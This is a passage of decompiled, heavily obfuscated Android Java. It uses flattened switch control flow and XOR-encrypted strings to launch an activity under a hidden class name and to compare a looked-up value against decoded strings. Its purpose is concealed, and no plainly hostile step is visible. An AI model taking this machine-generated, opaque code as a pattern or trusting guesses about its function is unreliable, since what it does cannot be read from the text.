                    long j100 = (j99 | (j99 >>> 2)) & 252645135;
                    bArr4[((((int) (((j100 | (j100 >>> 4)) & 16711935) | (((((j97 >>> 4) | j97) & 16711935) << 8) | j94))) & (-973006824)) + 9453575) ^ (-963553220)] = 40;
                    bArr4[36] = 46;
                    bArr4[37] = -35;
                    bArr4[38] = -62;
                    bArr4[39] = 67;
                    bArr4[40] = 99;
                    bArr4[41] = 18;
                    bArr4[42] = 65;
                    x(bArr3, bArr4);
                    intent.setClassName(intern2, new String(bArr3, charset2).intern());
                    intent.addFlags(268435456);
                    c5 = 13186;
                    b4 = 0;
                    break;
                case 13186:
                    try {
                        context.startActivity(intent);
                        byte[] bArr5 = {-94, 66, -113, -72, 77, 67, 99, 7, 29, 66, -1, 55, 23, 118, -127, 82, 98, 46, 123};
                        x(bArr5, new byte[]{-60, 43, -31, -36, 31, 44, 12, 115, 92, 50, -113, 117, 110, 63, -17, 38, 7, 64, 15});
                        charset = StandardCharsets.UTF_8;
                        intern = new String(bArr5, charset).intern();
                        bArr = new byte[4];
                        long j101 = -1637704064;
                        long j102 = -1;
                        long b9 = c3.b((((((((j101 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j101 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j101 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j101 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), ((((((((j102 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j102 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j102 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j102 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), 6148914691236517205L);
                        long j103 = (b9 >>> 48) & 43690;
                        long j104 = ((j103 >>> 2) | (j103 >>> 1)) & 858993459;
                        long j105 = ((j104 >>> 2) | j104) & 252645135;
                        long j106 = (b9 >>> 32) & 43690;
                        long j107 = ((j106 >>> 2) | (j106 >>> 1)) & 858993459;
                        long j108 = ((j107 >>> 2) | j107) & 252645135;
                        long j109 = (b9 >>> 16) & 43690;
                        long j110 = ((j109 >>> 2) | (j109 >>> 1)) & 858993459;
                        long j111 = ((j110 >>> 2) | j110) & 252645135;
                        long j112 = b9 & 43690;
                        long j113 = ((j112 >>> 2) | (j112 >>> 1)) & 858993459;
                        long j114 = ((j113 >>> 2) | j113) & 252645135;
                        bArr[((((int) (((j114 | (j114 >>> 4)) & 16711935) | (((((j111 >>> 4) | j111) & 16711935) << 8) | (((((j108 >>> 4) | j108) & 16711935) << 16) | ((((j105 >>> 4) | j105) & 16711935) << 24))))) | (-143412617)) + 682544525) ^ 682544524] = -49;
                        bArr[1] = 93;
                        bArr[2] = -123;
                        bArr[3] = -97;
                        x(bArr, new byte[]{-69, 47, -16, -6, 72, -115, 60, -21});
                    } catch (ActivityNotFoundException e5) {
                        e4 = e5;
                    } catch (Exception e6) {
                        e4 = e6;
                    }
                    try {
                        t(intern, new String(bArr, charset).intern());
                        c5 = 56286;
                        z3 = true;
                    } catch (ActivityNotFoundException e7) {
                        e4 = e7;
                        c4 = 43962;
                        c5 = c4;
                    } catch (Exception e8) {
                        e4 = e8;
                        c4 = 760;
                        c5 = c4;
                    }
                default:
                    c5 = 23569;
                    break;
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0062. Please report as an issue. */
    public final boolean R() {
        String str = null;
        char c4 = 49607;
        while (true) {
            switch (c4) {
                case 26287:
                    byte[] bArr = {61, -7, 60, 117, 8, -64};
                    long j2 = 96391183;
                    long j3 = -1;
                    long j4 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32)) + ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
                    long j5 = (j4 >>> 48) & 43690;
                    long j6 = ((j5 >>> 2) | (j5 >>> 1)) & 858993459;
                    long j7 = (j6 | (j6 >>> 2)) & 252645135;
                    long j8 = (j4 >>> 32) & 43690;
                    long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
                    long j10 = (j9 | (j9 >>> 2)) & 252645135;
                    long j11 = (((j7 | (j7 >>> 4)) & 16711935) << 24) | (((j10 | (j10 >>> 4)) & 16711935) << 16);
                    long j12 = (j4 >>> 16) & 43690;
                    long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
                    long j14 = (j13 | (j13 >>> 2)) & 252645135;
                    long j15 = (((j14 | (j14 >>> 4)) & 16711935) << 8) + j11;
                    long j16 = j4 & 43690;
                    long j17 = ((j16 >>> 2) | (j16 >>> 1)) & 858993459;
                    long j18 = (j17 | (j17 >>> 2)) & 252645135;
                    long j19 = 34506839;
                    long j20 = (int) (((j18 | (j18 >>> 4)) & 16711935) + j15);
                    long j21 = ((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (((((((((j20 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((j20 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j20 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j20 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32));
                    long j22 = (j21 >>> 48) & 43690;
                    long j23 = ((j22 >>> 2) | (j22 >>> 1)) & 858993459;
                    long j24 = (j23 | (j23 >>> 2)) & 252645135;
                    long j25 = (j21 >>> 32) & 43690;
                    long j26 = ((j25 >>> 2) | (j25 >>> 1)) & 858993459;
                    long j27 = (j26 | (j26 >>> 2)) & 252645135;
                    long j28 = (((j27 | (j27 >>> 4)) & 16711935) << 16) + (((j24 | (j24 >>> 4)) & 16711935) << 24);
                    long j29 = (j21 >>> 16) & 43690;
                    long j30 = ((j29 >>> 2) | (j29 >>> 1)) & 858993459;
                    long j31 = (j30 | (j30 >>> 2)) & 252645135;
                    long j32 = j21 & 43690;
                    long j33 = ((j32 >>> 2) | (j32 >>> 1)) & 858993459;
                    long j34 = (j33 | (j33 >>> 2)) & 252645135;
                    int i = (int) (((j34 | (j34 >>> 4)) & 16711935) + ((((j31 | (j31 >>> 4)) & 16711935) << 8) | j28));
                    int i3 = (1076904232 & i) + (i | 1076904232);
                    long j35 = 1111410967;
                    long j36 = i3;
                    long j37 = ((((((((j35 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j35 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j35 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j35 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (((((((((j36 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j36 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((j36 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j36 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16))));
                    long j38 = (j37 >>> 48) & 21845;
                    long j39 = (j38 | (j38 >>> 1)) & 858993459;
                    long j40 = (j39 | (j39 >>> 2)) & 252645135;
                    long j41 = (j37 >>> 32) & 21845;
                    long j42 = (j41 | (j41 >>> 1)) & 858993459;
                    long j43 = (j42 | (j42 >>> 2)) & 252645135;
                    long j44 = (((j40 | (j40 >>> 4)) & 16711935) << 24) | (((j43 | (j43 >>> 4)) & 16711935) << 16);
                    long j45 = (j37 >>> 16) & 21845;
                    long j46 = (j45 | (j45 >>> 1)) & 858993459;
                    long j47 = (j46 | (j46 >>> 2)) & 252645135;
                    long j48 = j37 & 21845;
                    long j49 = (j48 | (j48 >>> 1)) & 858993459;
                    long j50 = (j49 | (j49 >>> 2)) & 252645135;
                    z(bArr, new byte[]{32, -86, -30, -69, 103, -73, (int) (((j50 | (j50 >>> 4)) & 16711935) + (j44 | (((j47 | (j47 >>> 4)) & 16711935) << 8))), -25});
                    c4 = !str.equals(new String(bArr, StandardCharsets.UTF_8).intern()) ? (char) 59046 : (char) 36321;
                case 49607:
                    byte[] bArr2 = new byte[33];
                    bArr2[0] = 29;
                    bArr2[1] = -67;
                    bArr2[2] = 16;
                    bArr2[3] = -105;
                    bArr2[4] = 35;
                    long j51 = -1;
                    long j52 = 0;
                    long j53 = (((((j52 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j54 = (((((((j52 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j55 = (((((((j52 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j56 = (((((((j52 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j57 = (((((j51 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j58 = (((((((j51 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j59 = (((((((j51 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j60 = j59 + j58 + j57;
                    long j61 = (((((((j51 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j62 = j61 + j60 + (j56 | j55 | j54 | j53);
                    long j63 = (j62 >>> 48) & 21845;
                    long j64 = ((j63 >>> 1) | j63) & 858993459;
                    long j65 = ((j64 >>> 2) | j64) & 252645135;
                    long j66 = (j62 >>> 32) & 21845;
                    long j67 = ((j66 >>> 1) | j66) & 858993459;
                    long j68 = ((j67 >>> 2) | j67) & 252645135;
                    long j69 = ((((j68 >>> 4) | j68) & 16711935) << 16) | ((((j65 >>> 4) | j65) & 16711935) << 24);
                    long j70 = (j62 >>> 16) & 21845;
                    long j71 = ((j70 >>> 1) | j70) & 858993459;
                    long j72 = ((j71 >>> 2) | j71) & 252645135;
                    long j73 = ((((j72 >>> 4) | j72) & 16711935) << 8) + j69;
                    long j74 = j62 & 21845;
                    long j75 = ((j74 >>> 1) | j74) & 858993459;
                    long j76 = ((j75 >>> 2) | j75) & 252645135;
                    bArr2[(((((int) ((((j76 >>> 4) | j76) & 16711935) | j73)) | (-1741957958)) & 411615410) + 587402753) ^ 999018166] = -48;
                    bArr2[6] = -22;
                    bArr2[7] = 87;
                    bArr2[8] = -40;
                    bArr2[9] = -50;
                    bArr2[10] = 125;
                    bArr2[11] = 106;
                    bArr2[12] = 97;
                    bArr2[13] = -126;
                    bArr2[14] = 36;
                    bArr2[15] = 65;
                    bArr2[16] = 10;
                    bArr2[17] = -124;
                    bArr2[18] = 110;
                    bArr2[19] = -69;
                    bArr2[20] = 107;
                    bArr2[21] = -52;
                    bArr2[22] = 115;
                    bArr2[23] = 109;
                    bArr2[24] = 52;
                    bArr2[25] = 70;
                    bArr2[26] = 71;
                    bArr2[27] = 63;
                    bArr2[28] = 6;
                    bArr2[29] = -95;
                    bArr2[30] = 71;
                    bArr2[31] = -124;
                    bArr2[32] = -69;
                    long j77 = 11010453;
                    long b4 = c3.b((((((((j77 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j77 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j77 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j77 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), AbstractC0008a.h(j54, j53, j55, j56), 6148914691236517205L);
                    long j78 = (b4 >>> 48) & 43690;
                    long j79 = ((j78 >>> 2) | (j78 >>> 1)) & 858993459;
                    long j80 = ((j79 >>> 2) | j79) & 252645135;
                    long j81 = (b4 >>> 32) & 43690;
                    long j82 = ((j81 >>> 2) | (j81 >>> 1)) & 858993459;
                    long j83 = ((j82 >>> 2) | j82) & 252645135;
                    long j84 = ((((j83 >>> 4) | j83) & 16711935) << 16) + ((((j80 >>> 4) | j80) & 16711935) << 24);
                    long j85 = (b4 >>> 16) & 43690;
                    long j86 = ((j85 >>> 2) | (j85 >>> 1)) & 858993459;
                    long j87 = ((j86 >>> 2) | j86) & 252645135;
                    long j88 = b4 & 43690;
                    long j89 = ((j88 >>> 2) | (j88 >>> 1)) & 858993459;
                    long j90 = ((j89 >>> 2) | j89) & 252645135;
                    byte[] bArr3 = new byte[431804828 ^ (420794408 + ((int) ((((j90 >>> 4) | j90) & 16711935) | (((((j87 >>> 4) | j87) & 16711935) << 8) + j84))))];
                    bArr3[0] = 22;
                    bArr3[1] = -18;
                    long j91 = -51316521;
                    long j92 = (((((((((j91 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j91 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j91 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j91 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j61 + (j59 | j58 | j57) + 6148914691236517205L;
                    long j93 = (j92 >>> 48) & 43690;
                    long j94 = ((j93 >>> 2) | (j93 >>> 1)) & 858993459;
                    long j95 = ((j94 >>> 2) | j94) & 252645135;
                    long j96 = (j92 >>> 32) & 43690;
                    long j97 = ((j96 >>> 2) | (j96 >>> 1)) & 858993459;
                    long j98 = ((j97 >>> 2) | j97) & 252645135;
                    long j99 = ((((j98 >>> 4) | j98) & 16711935) << 16) + ((((j95 >>> 4) | j95) & 16711935) << 24);
                    long j100 = (j92 >>> 16) & 43690;
                    long j101 = ((j100 >>> 2) | (j100 >>> 1)) & 858993459;
                    long j102 = ((j101 >>> 2) | j101) & 252645135;
                    long j103 = j92 & 43690;
                    long j104 = ((j103 >>> 2) | (j103 >>> 1)) & 858993459;
                    long j105 = ((j104 >>> 2) | j104) & 252645135;
                    bArr3[2] = ((((int) ((((j105 >>> 4) | j105) & 16711935) | (((((j102 >>> 4) | j102) & 16711935) << 8) | j99))) & 538970467) - 989585400) ^ 450614941;
                    bArr3[3] = 69;
                    bArr3[4] = 53;
                    bArr3[5] = -115;
                    bArr3[6] = 8;
                    bArr3[7] = -43;
                    bArr3[8] = -50;
                    bArr3[9] = -109;
                    bArr3[10] = -35;
                    bArr3[11] = -82;
                    bArr3[12] = 114;
                    bArr3[13] = -33;
                    bArr3[14] = -62;
                    bArr3[15] = -47;
                    bArr3[16] = 16;
                    bArr3[17] = -41;
                    bArr3[18] = -118;
                    bArr3[19] = 112;
                    bArr3[20] = 97;
                    bArr3[21] = -101;
                    bArr3[22] = -92;
                    bArr3[23] = -85;
                    bArr3[24] = 50;
                    long j106 = 1233144516;
                    long j107 = ((((((((j106 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((j106 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j106 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j106 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32)) + (j61 | j60);
                    long j108 = (j107 >>> 48) & 43690;
                    long j109 = ((j108 >>> 2) | (j108 >>> 1)) & 858993459;
                    long j110 = (j109 | (j109 >>> 2)) & 252645135;
                    long j111 = (j107 >>> 32) & 43690;
                    long j112 = ((j111 >>> 2) | (j111 >>> 1)) & 858993459;
                    long j113 = (j112 | (j112 >>> 2)) & 252645135;
                    long j114 = (((j113 | (j113 >>> 4)) & 16711935) << 16) + (((j110 | (j110 >>> 4)) & 16711935) << 24);
                    long j115 = (j107 >>> 16) & 43690;
                    long j116 = ((j115 >>> 2) | (j115 >>> 1)) & 858993459;
                    long j117 = (j116 | (j116 >>> 2)) & 252645135;
                    long j118 = j107 & 43690;
                    long j119 = ((j118 >>> 2) | (j118 >>> 1)) & 858993459;
                    long j120 = (j119 | (j119 >>> 2)) & 252645135;
                    bArr3[25] = (((int) (((j120 | (j120 >>> 4)) & 16711935) + ((((j117 | (j117 >>> 4)) & 16711935) << 8) + j114))) + 269223170) ^ 1502367709;
                    bArr3[26] = -90;
                    bArr3[27] = -23;
                    bArr3[28] = 17;
                    bArr3[29] = -61;
                    bArr3[30] = -108;
                    bArr3[31] = 82;
                    bArr3[32] = -34;
                    z(bArr2, bArr3);
                    str = E1.d(new String(bArr2, StandardCharsets.UTF_8).intern());
                    c4 = str != null ? (char) 26287 : (char) 25282;
                case 7159:
                    byte[] bArr4 = {30, -93, 105};
                    z(bArr4, new byte[]{108, -58, 13, 16, -67, -10, 50, 60});
                    if (str.equals(new String(bArr4, StandardCharsets.UTF_8).intern())) {
                    }
                case 25282:
                    return false;
                case 36321:
                    byte[] bArr5 = new byte[28];
                    bArr5[0] = -56;
                    bArr5[1] = -80;
                    bArr5[2] = 42;
                    bArr5[3] = 102;
                    bArr5[4] = 10;
                    bArr5[5] = 1;
                    long j121 = -1;
                    long j122 = 0;
                    long j123 = (((((j122 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j124 = (((((((j122 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j125 = j124 | j123;
                    long j126 = (((((((j122 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j127 = (((((((j122 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j128 = (((((j121 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j129 = (((((((j121 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j130 = (((((((j121 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j131 = (((((((j121 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j132 = j131 + (j130 | j129 | j128) + (j127 | j126 | j125);
                    long j133 = (j132 >>> 48) & 21845;
                    long j134 = ((j133 >>> 1) | j133) & 858993459;
                    long j135 = ((j134 >>> 2) | j134) & 252645135;
                    long j136 = (j132 >>> 32) & 21845;
                    long j137 = ((j136 >>> 1) | j136) & 858993459;
                    long j138 = ((j137 >>> 2) | j137) & 252645135;
                    long j139 = ((((j138 >>> 4) | j138) & 16711935) << 16) + ((((j135 >>> 4) | j135) & 16711935) << 24);
                    long j140 = (j132 >>> 16) & 21845;
                    long j141 = ((j140 >>> 1) | j140) & 858993459;
                    long j142 = ((j141 >>> 2) | j141) & 252645135;
                    long j143 = ((((j142 >>> 4) | j142) & 16711935) << 8) + j139;
                    long j144 = j132 & 21845;
                    long j145 = ((j144 >>> 1) | j144) & 858993459;
                    long j146 = ((j145 >>> 2) | j145) & 252645135;
                    bArr5[(-2125705135) ^ (17567808 + ((((int) ((((j146 >>> 4) | j146) & 16711935) + j143)) | 1937004691) & (-2143272937)))] = 40;
                    bArr5[7] = 90;
                    bArr5[8] = -121;
                    bArr5[9] = 78;
                    bArr5[10] = 43;
                    bArr5[11] = 24;
                    bArr5[12] = -96;
                    bArr5[13] = -39;
                    bArr5[14] = 33;
                    bArr5[15] = 82;
                    bArr5[16] = 126;
                    bArr5[17] = 16;
                    long j147 = 538970117;
                    long j148 = j126 + j125;
                    long b5 = c3.b((((((((j147 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j147 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j147 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j147 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j127 | j148, 6148914691236517205L);
                    long j149 = (b5 >>> 48) & 43690;
                    long j150 = ((j149 >>> 2) | (j149 >>> 1)) & 858993459;
                    long j151 = ((j150 >>> 2) | j150) & 252645135;
                    long j152 = (b5 >>> 32) & 43690;
                    long j153 = ((j152 >>> 2) | (j152 >>> 1)) & 858993459;
                    long j154 = ((j153 >>> 2) | j153) & 252645135;
                    long j155 = ((((j154 >>> 4) | j154) & 16711935) << 16) + ((((j151 >>> 4) | j151) & 16711935) << 24);
                    long j156 = (b5 >>> 16) & 43690;
                    long j157 = ((j156 >>> 2) | (j156 >>> 1)) & 858993459;
                    long j158 = ((j157 >>> 2) | j157) & 252645135;
                    long j159 = b5 & 43690;
                    long j160 = ((j159 >>> 2) | (j159 >>> 1)) & 858993459;
                    long j161 = ((j160 >>> 2) | j160) & 252645135;
                    bArr5[573098503 ^ (34128400 + ((int) ((((j161 >>> 4) | j161) & 16711935) + (((((j158 >>> 4) | j158) & 16711935) << 8) + j155))))] = -101;
                    bArr5[19] = -90;
                    long j162 = -1430827327;
                    long j163 = -1430827386;
                    long j164 = (((((((((j162 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j162 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j162 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j162 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j163 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j163 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j163 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j163 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j165 = (j164 >>> 48) & 21845;
                    long j166 = ((j165 >>> 1) | j165) & 858993459;
                    long j167 = ((j166 >>> 2) | j166) & 252645135;
                    long j168 = (j164 >>> 32) & 21845;
                    long j169 = ((j168 >>> 1) | j168) & 858993459;
                    long j170 = ((j169 >>> 2) | j169) & 252645135;
                    long j171 = ((((j170 >>> 4) | j170) & 16711935) << 16) + ((((j167 >>> 4) | j167) & 16711935) << 24);
                    long j172 = (j164 >>> 16) & 21845;
                    long j173 = ((j172 >>> 1) | j172) & 858993459;
                    long j174 = ((j173 >>> 2) | j173) & 252645135;
                    long j175 = j164 & 21845;
                    long j176 = ((j175 >>> 1) | j175) & 858993459;
                    long j177 = ((j176 >>> 2) | j176) & 252645135;
                    bArr5[20] = (int) ((((j177 >>> 4) | j177) & 16711935) + (((((j174 >>> 4) | j174) & 16711935) << 8) | j171));
                    bArr5[21] = 23;
                    bArr5[22] = -51;
                    bArr5[23] = 114;
                    bArr5[24] = 25;
                    bArr5[25] = 7;
                    bArr5[26] = 106;
                    bArr5[27] = -14;
                    long a2 = AbstractC0088u0.a(j129, j128, j130, j131, j127 + (j126 | (j124 + j123)));
                    long j178 = (a2 >>> 48) & 21845;
                    long j179 = ((j178 >>> 1) | j178) & 858993459;
                    long j180 = ((j179 >>> 2) | j179) & 252645135;
                    long j181 = (a2 >>> 32) & 21845;
                    long j182 = ((j181 >>> 1) | j181) & 858993459;
                    long j183 = ((j182 >>> 2) | j182) & 252645135;
                    long j184 = ((((j183 >>> 4) | j183) & 16711935) << 16) + ((((j180 >>> 4) | j180) & 16711935) << 24);
                    long j185 = (a2 >>> 16) & 21845;
                    long j186 = ((j185 >>> 1) | j185) & 858993459;
                    long j187 = ((j186 >>> 2) | j186) & 252645135;
                    long j188 = a2 & 21845;
                    long j189 = ((j188 >>> 1) | j188) & 858993459;
                    long j190 = ((j189 >>> 2) | j189) & 252645135;
                    int i4 = (((int) ((((j190 >>> 4) | j190) & 16711935) | ((((j187 >>> 4) | j187) & 16711935) << 8) | j184)) | 1514789781) & 134420948;
                    long j191 = 10617921;
                    long j192 = (((((((((j191 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j191 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j191 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j191 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j148 + j127;
                    long j193 = (j192 >>> 48) & 43690;
                    long j194 = ((j193 >>> 2) | (j193 >>> 1)) & 858993459;
                    long j195 = ((j194 >>> 2) | j194) & 252645135;
                    long j196 = (j192 >>> 32) & 43690;
                    long j197 = ((j196 >>> 2) | (j196 >>> 1)) & 858993459;
                    long j198 = ((j197 >>> 2) | j197) & 252645135;
                    long j199 = ((((j198 >>> 4) | j198) & 16711935) << 16) | ((((j195 >>> 4) | j195) & 16711935) << 24);
                    long j200 = (j192 >>> 16) & 43690;
                    long j201 = ((j200 >>> 2) | (j200 >>> 1)) & 858993459;
                    long j202 = ((j201 >>> 2) | j201) & 252645135;
                    long j203 = j192 & 43690;
                    long j204 = ((j203 >>> 2) | (j203 >>> 1)) & 858993459;
                    long j205 = (j204 | (j204 >>> 2)) & 252645135;
                    z(bArr5, new byte[]{-49, -26, -3, -93, 5, 69, -1, -114, -118, 26, -16, -33, -88, -23, -64, -125, 102, (i4 + (((int) (((j205 | (j205 >>> 4)) & 16711935) | (((((j202 >>> 4) | j202) & 16711935) << 8) + j199))) | (-1327234047))) ^ (-1192813153), 122, 101, 79, 68, 41, -57, 1, 72, -116, 53});
                    p(new String(bArr5, StandardCharsets.UTF_8).intern(), str);
                    return true;
                case 59046:
                    byte[] bArr6 = new byte[6];
                    bArr6[0] = -25;
                    bArr6[1] = 24;
                    long j206 = -1175993615;
                    long j207 = -1;
